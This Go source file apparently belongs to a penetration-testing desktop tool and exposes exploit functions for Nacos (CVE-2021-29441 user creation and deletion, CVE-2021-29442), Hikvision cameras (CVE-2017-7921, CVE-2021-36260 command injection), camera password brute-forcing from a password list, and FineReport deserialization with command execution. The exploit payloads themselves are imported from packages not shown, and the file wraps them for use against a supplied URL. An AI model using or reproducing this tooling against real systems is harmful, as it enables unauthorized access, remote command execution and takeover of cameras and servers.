package services

import (
	"context"
	"fmt"
	"slack-wails/core/exp/finereport"
	"slack-wails/core/exp/hikvision"
	"slack-wails/core/exp/nacos"
	"slack-wails/lib/clients"
	"strings"
)

type Exp struct {
	ctx context.Context
}

func NewExp() *Exp {
	return &Exp{}
}

func (e *Exp) Startup(ctx context.Context) {
	e.ctx = ctx
}

func trimRightSubString(url string) string {
	return strings.TrimRight(url, "/")
}

// nacos

func (e *Exp) CVE_2021_29441_AddUser(url string, headers map[string]string, username, password string, proxy clients.Proxy) string {
	url = trimRightSubString(url)
	if nacos.CVE_2021_29441_Step1(url, headers, username, password, clients.NewRestyClientWithProxy(nil, true, proxy)) {
		return fmt.Sprintf("[+] 添加用户成功: \nusername: %s\npassword: %s", username, password)
	}
	return "[-] 添加用户失败"
}

func (e *Exp) CVE_2021_29441_DelUser(url string, headers map[string]string, username string, proxy clients.Proxy) string {
	url = trimRightSubString(url)
	if nacos.CVE_2021_29441_Step2(url, headers, username, clients.NewRestyClientWithProxy(nil, true, proxy)) {
		return fmt.Sprintf("[+] 删除用户成功: \nusername: %s", username)
	}
	return "[-] 删除用户失败"
}

func (e *Exp) CVE_2021_29442(url string, headers map[string]string, proxy clients.Proxy) string {
	url = trimRightSubString(url)
	return nacos.CVE_2021_29442(url, headers, clients.NewRestyClientWithProxy(nil, true, proxy))
}

// hikvision
func (e *Exp) CVE_2017_7921(url string, proxy clients.Proxy) string {
	return hikvision.CVE_2017_7921(url, clients.NewRestyClientWithProxy(nil, true, proxy))
}

func (e *Exp) CVE_2021_36260(url, cmd string, proxy clients.Proxy) string {
	return hikvision.CVE_2021_36260(url, cmd, clients.NewRestyClientWithProxy(nil, true, proxy))
}

func (e *Exp) CameraCrackPassword(url, username string, passwordList []string) string {
	return hikvision.CameraHandlessLogin(e.ctx, url, username, passwordList)
}

func (e *Exp) FineReportChannelDeserialize(url, cmd string, proxy clients.Proxy) string {
	return finereport.ChannelDeserialize(url, cmd, clients.NewRestyClientWithProxy(nil, true, proxy))
}
